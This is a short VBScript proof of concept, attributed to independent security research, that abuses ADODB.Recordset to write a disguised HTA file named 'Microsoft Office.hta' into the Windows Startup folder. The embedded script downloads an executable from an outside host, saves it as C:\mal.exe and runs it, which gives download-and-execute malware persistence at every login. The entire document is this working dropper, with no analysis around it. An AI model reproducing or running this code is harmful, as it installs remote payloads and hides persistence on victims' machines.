on error resume next
' indepedent security research by www.MichaelEvanchik.com
set evanchik = CreateObject("ADODB.Recordset")
   With evanchik
       .Fields.Append "evanchik", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("evanchik").Value = "<script language=vbscript>: on error resume next : set o = CreateObject(""msxml2.XMLHTTP"") : o.open ""GET"",""http://megatop.biz/1/1.xp.exe"",False : o.send : set s = createobject(""adodb.stream"") : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""C:\mal.exe"",2 : Set ws = CreateObject(""WScript.Shell"") : ws.Run ""C:\mal.exe"", 3, FALSE : </script>"
       Call .Update
   End With
evanchik.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Microsoft Office.hta", adPersistXML
evanchik.Save "C:\office.hta", adPersistXML
evanchik.Close
